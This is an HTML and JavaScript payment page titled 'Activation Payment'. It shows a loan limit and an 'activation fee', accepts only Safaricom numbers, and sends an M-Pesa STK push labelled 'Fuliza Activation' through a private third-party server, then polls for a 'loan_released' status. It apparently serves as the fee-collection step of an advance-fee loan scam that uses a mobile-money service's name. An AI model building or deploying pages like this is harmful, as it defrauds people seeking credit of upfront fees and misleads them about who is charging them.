<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activation Payment</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
.top-bar{background:#000;padding:10px;text-align:center;}
.logo{height:99px;}
.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
.info{margin:10px 0;font-size:16px;}
input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
.pay-btn:hover{background:#179937;}
.spinner{margin-top:15px;display:none;}
.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
.message{margin-top:15px;font-size:14px;}
</style>
</head>
<body>

<header class="top-bar">
<img src="test1.jpeg" class="logo">
</header>

<div class="payment-box">
<h2>Activation Payment</h2>

<div class="info">Selected Limit: <strong id="limit"></strong></div>
<div class="info">Activation Fee: <strong id="fee"></strong></div>
<input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX)">
<button class="pay-btn" onclick="payNow()">Pay Activation Fee</button>

<div class="spinner" id="spinner"><div class="loader"></div></div>
<div class="message" id="message"></div>
</div>

<script>
const selectedAmount = localStorage.getItem("selectedAmount");
const activationFee = localStorage.getItem("activationFee");
document.getElementById("limit").innerText = "KSh " + selectedAmount;
document.getElementById("fee").innerText = "KSh " + activationFee;

function isSafaricom(number){
  return /^(07|01)[0-9]{8}$/.test(number);
}

async function payNow(){
  const phone = document.getElementById("phone").value.trim();
  const msg = document.getElementById("message");
  const spinner = document.getElementById("spinner");

  if(!phone){
    msg.innerText="Enter phone number";
    msg.style.color="red";
    return;
  }
  if(!isSafaricom(phone)){
    msg.innerText="Only Safaricom numbers allowed (07XXXXXXXX or 01XXXXXXXX)";
    msg.style.color="red";
    return;
  }

  // convert to international format
  let phoneToSend = phone.startsWith("0") ? "254"+phone.substring(1) : phone;

  spinner.style.display="block";
  msg.innerText="Sending STK Push...";
  msg.style.color="black";

  try{
    const res = await fetch("https://nyota-paynecta-server.onrender.com/pay",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        phone: phoneToSend,
        amount: Number(activationFee),
        account: "Fuliza Activation"
      })
    });

    const data = await res.json();
    spinner.style.display="none";
    console.log("Pay response:", data);

    if(data.success){
      msg.innerText="Check your phone and enter M-Pesa PIN...";
      msg.style.color="green";
      checkPayment(data.reference || data.receipt.reference);
    }else{
      msg.innerText="Payment failed: "+(data.error || "Unknown error");
      msg.style.color="red";
    }
  }catch(err){
    spinner.style.display="none";
    msg.innerText="Server error: "+(err.message || "Try again");
    msg.style.color="red";
  }
}

// Poll payment status every 3 seconds
async function checkPayment(reference){
  const msg = document.getElementById("message");
  let attempts = 0;
  const interval = setInterval(async()=>{
    attempts++;
    if(attempts>20){ // timeout ~1 min
      clearInterval(interval);
      msg.innerText="Payment timeout. Please try again.";
      msg.style.color="red";
      return;
    }
    try{
      const res = await fetch("https://nyota-paynecta-server.onrender.com/receipt/"+reference);
      const data = await res.json();
      if(data.success && data.receipt){
        const status = data.receipt.status.toLowerCase();
        if(status==="processing" || status==="loan_released"){
          clearInterval(interval);
          msg.innerText="Payment successful ✅ Redirecting...";
          msg.style.color="green";
          setTimeout(()=>{window.location.href="success.html"},2000);
        }
        if(status==="cancelled" || status==="stk_failed" || status==="error"){
          clearInterval(interval);
          msg.innerText="Payment failed or cancelled: "+data.receipt.status_note;
          msg.style.color="red";
        }
      }
    }catch(e){}
  },3000);
}
</script>

</body>
</html>
